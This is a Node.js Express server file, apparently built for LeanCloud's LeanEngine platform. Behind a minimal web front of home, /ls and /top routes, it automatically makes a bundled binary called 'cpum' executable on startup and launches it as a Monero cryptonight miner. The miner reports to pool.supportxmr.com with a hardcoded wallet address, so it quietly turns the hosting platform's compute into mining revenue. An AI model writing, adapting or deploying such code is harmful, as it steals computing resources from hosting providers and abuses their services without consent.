'use strict';

var express = require('express');
const { spawn } = require('child_process');
const { spawnSync } = require('child_process');

var LEANCLOUD_APP_DOMAIN = process.env.LEANCLOUD_APP_DOMAIN || 'LEANCLOUD_APP_DOMAIN';
// 端口一定要从环境变量 `LEANCLOUD_APP_PORT` 中获取。
// LeanEngine 运行时会分配端口并赋值到该变量。
var LEANCLOUD_APP_PORT = parseInt(process.env.LEANCLOUD_APP_PORT || process.env.PORT || 3000);

var WALLET_ADDRESS ='496oNrFu5WAGHw6by228ofjExonQarbNWcWk1aC7QLMKdPpCa2ZBBD9QPqndnWQJ6pTmqFhtr4XZZGJPbK632HkS14qAbNK'
var STR_CMD = './cpum --threads=1 --algo=cryptonight --url=stratum+tcp://pool.supportxmr.com:3333 --user=' + WALLET_ADDRESS + ' --pass=WK.' + LEANCLOUD_APP_DOMAIN
//var STR_CMD = './cpum --benchmark --threads=1'
var num_data = 0

function ls() {
        const shell = spawn('ls', ['-l']);
        shell.stdout.on('data', (data) => {
            console.log(`stdout: ${data}`);
        });
        shell.stderr.on('data', (data) => {
            console.log(`stderr: ${data}`);
        });
        shell.on('close', (code) => {
            console.log(`ls close：${code}`);
        });
        return 'return from ls';
}

function top() {
        return 'pass by top';
        const shell = spawn('top', ['-bn', '1']);
        shell.stdout.on('data', (data) => {
            console.log(`stdout: ${data}`);
        });
        shell.stderr.on('data', (data) => {
            console.log(`stderr: ${data}`);
        });
        shell.on('close', (code) => {
            console.log(`top close：${code}`);
        });
        return 'return from top';
}

function chmod() {
        console.log('call chmod()');
        const shell = spawnSync('chmod', ['+x', 'cpum']);
        /*shell.stdout.on('data', (data) => {
            console.log(`stdout: ${data}`);
        });
        shell.stderr.on('data', (data) => {
            console.log(`stderr: ${data}`);
        });
        shell.on('close', (code) => {
            console.log(`chmod close：${code}`);
        });*/
        return 'return from chmod';
}

function cpum() {
        ////////////////////////////////////////
        console.log('call cpum()');
        //const shell = spawn('./cpum', ['--threads=1', '--benchmark']);
        const shell = spawn('./cpum', ['--threads=1', '--algo=cryptonight', '--url=stratum+tcp://pool.supportxmr.com:3333', '--user=' + WALLET_ADDRESS, '--pass=WK.' + LEANCLOUD_APP_DOMAIN]);

        shell.stdout.on('data', (data) => {
            if(data)
                console.log(`stdout: ${data}`);
        });
        shell.stderr.on('data', (data) => {
            if(data)
                console.log(`stderr: ${data}`);
            num_data += 1;
            if(num_data>16){
                num_data = 0;
                console.log('XXXXX');
            }
        });
        shell.on('close', (code) => {
            console.log(`./cpum close：${code}`);
        });
        return 'return from cpum';
}


async function EngineStart() {
    console.log('**************************************************');
    console.log('Engine Starting');
    //Wait if cpum is running, in deploying
    for (var i = 0; i < 5888888; i++) {
            new Date();
    }
    const tmp_chmod = await chmod();
    console.log(tmp_chmod);
    //for (var i = 0; i < 3888888; i++) {
    //        new Date();
    //}
    console.log('**************************************************');
    const tmp_cpum = cpum();
}

//////////////////////////////////////////////////////
var app = express();
app.get('/', function (req, res) {
    console.log('Home page requestd');
    res.send('Home page');
})

app.get('/ls', function (req, res) {
    console.log('ls page requestd');
    ls();
    res.send('ls page');
})

app.get('/top', function (req, res) {
    console.log('top page requestd');
    top();
    res.send('top page');
})

//////////////////////////////////////////////////////
var server = app.listen(LEANCLOUD_APP_PORT, function () {

    console.log('**************************************************');
    console.log(new Date());
    console.log('LEANCLOUD_APP_DOMAIN:',LEANCLOUD_APP_DOMAIN);
    console.log('LEANCLOUD_APP_PORT:',LEANCLOUD_APP_PORT);
    //console.log(STR_CMD);
    //console.log('process.env:',process.env);
    //console.log('LC_APP_PORT:',process.env.LC_APP_PORT);
    //console.log('LEANCLOUD_APP_PORT:',process.env.LEANCLOUD_APP_PORT);
    console.log('LEANCLOUD_VERSION_TAG:',process.env.LEANCLOUD_VERSION_TAG);
    console.log('**************************************************');
    console.log(new Date());
    EngineStart();
});
